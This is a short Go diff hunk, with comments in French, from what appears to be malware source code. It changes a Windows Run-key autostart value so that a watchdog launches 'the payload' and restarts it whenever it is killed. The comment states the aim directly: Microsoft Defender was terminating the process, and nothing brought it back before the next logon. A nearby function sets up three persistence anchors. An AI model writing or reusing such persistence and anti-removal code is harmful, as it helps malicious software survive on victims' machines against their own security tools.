@@ -204,7 +204,10 @@ func runValue() string {
 	if exe == "" {
 		return ""
 	}
-	return `"` + exe + `" -silent`
+	// La clé Run lance le watchdog, qui démarre le payload et le relance
+	// s'il est tué. Le chemin seul ne suffisait pas : Defender termine le
+	// processus, et rien ne le relevait avant le logon suivant.
+	return `"` + exe + `" -watch`
 }
 
 // persistInstall pose les trois ancrages. Jamais d'erreur fatale : la
